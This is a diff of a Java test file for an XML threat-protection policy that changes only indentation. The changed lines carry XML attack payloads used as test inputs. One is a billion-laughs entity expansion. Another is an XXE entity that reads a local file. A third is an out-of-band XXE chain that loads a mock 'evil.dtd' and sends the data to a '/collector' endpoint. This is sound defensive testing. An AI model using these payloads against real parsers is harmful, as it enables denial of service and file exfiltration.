@@ -223,13 +223,13 @@ public class XmlThreatProtectionPolicyTest {
         readWriteStream.write(
             Buffer.buffer(
                 "<!DOCTYPE test [\n" +
-                "<!ENTITY lol \"lol\">\n" +
-                "<!ENTITY lol2 \"&lol; &lol;\">\n" +
-                "<!ENTITY lol3 \"&lol2; &lol2;\">\n" +
-                "<!ENTITY lol4 \"&lol3; &lol3;\">\n" +
-                "<!ENTITY lol5 \"&lol4; &lol4;\">\n" +
-                "]>\n" +
-                "<test>&lol5;</test>"
+                    "<!ENTITY lol \"lol\">\n" +
+                    "<!ENTITY lol2 \"&lol; &lol;\">\n" +
+                    "<!ENTITY lol3 \"&lol2; &lol2;\">\n" +
+                    "<!ENTITY lol4 \"&lol3; &lol3;\">\n" +
+                    "<!ENTITY lol5 \"&lol4; &lol4;\">\n" +
+                    "]>\n" +
+                    "<test>&lol5;</test>"
             )
         );
         readWriteStream.end();
@@ -292,10 +292,10 @@ public class XmlThreatProtectionPolicyTest {
         readWriteStream.write(
             Buffer.buffer(
                 "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
-                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://" +
-                path +
-                "\"> ]>\n" +
-                "<stockCheck><productId>&xxe;</productId></stockCheck>"
+                    "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://" +
+                    path +
+                    "\"> ]>\n" +
+                    "<stockCheck><productId>&xxe;</productId></stockCheck>"
             )
         );
         readWriteStream.end();
@@ -316,12 +316,11 @@ public class XmlThreatProtectionPolicyTest {
 
         int port = wireMockRule.port();
         stubFor(
-            get(urlEqualTo("/evil.dtd"))
-                .willReturn(
-                    aResponse()
-                        .withStatus(200)
-                        .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
-                )
+            get(urlEqualTo("/evil.dtd")).willReturn(
+                aResponse()
+                    .withStatus(200)
+                    .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
+            )
         );
         stubFor(get(urlEqualTo("/collector")).willReturn(aResponse().withStatus(200)));
 
@@ -330,16 +329,16 @@ public class XmlThreatProtectionPolicyTest {
         readWriteStream.write(
             Buffer.buffer(
                 "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
-                "<!DOCTYPE data [\n" +
-                "  <!ENTITY % file SYSTEM \"file://" +
-                path +
-                "\">\n" +
-                "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
-                port +
-                "/evil.dtd\">\n" +
-                "  %dtd;\n" +
-                "]>\n" +
-                "<data></data>"
+                    "<!DOCTYPE data [\n" +
+                    "  <!ENTITY % file SYSTEM \"file://" +
+                    path +
+                    "\">\n" +
+                    "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
+                    port +
+                    "/evil.dtd\">\n" +
+                    "  %dtd;\n" +
+                    "]>\n" +
+                    "<data></data>"
             )
         );
 
@@ -363,12 +362,11 @@ public class XmlThreatProtectionPolicyTest {
 
         int port = wireMockRule.port();
         stubFor(
-            get(urlEqualTo("/evil.dtd"))
-                .willReturn(
-                    aResponse()
-                        .withStatus(200)
-                        .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
-                )
+            get(urlEqualTo("/evil.dtd")).willReturn(
+                aResponse()
+                    .withStatus(200)
+                    .withBody("<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/collector'>\">" + "%all;")
+            )
         );
         stubFor(get(urlEqualTo("/collector")).willReturn(aResponse().withStatus(200)));
 
@@ -377,16 +375,16 @@ public class XmlThreatProtectionPolicyTest {
         readWriteStream.write(
             Buffer.buffer(
                 "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
-                "<!DOCTYPE data [\n" +
-                "  <!ENTITY % file SYSTEM \"file://" +
-                path +
-                "\">\n" +
-                "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
-                port +
-                "/evil.dtd\">\n" +
-                "  %dtd;\n" +
-                "]>\n" +
-                "<data>&send;</data>"
+                    "<!DOCTYPE data [\n" +
+                    "  <!ENTITY % file SYSTEM \"file://" +
+                    path +
+                    "\">\n" +
+                    "  <!ENTITY % dtd SYSTEM \"http://localhost:" +
+                    port +
+                    "/evil.dtd\">\n" +
+                    "  %dtd;\n" +
+                    "]>\n" +
+                    "<data>&send;</data>"
             )
         );
 
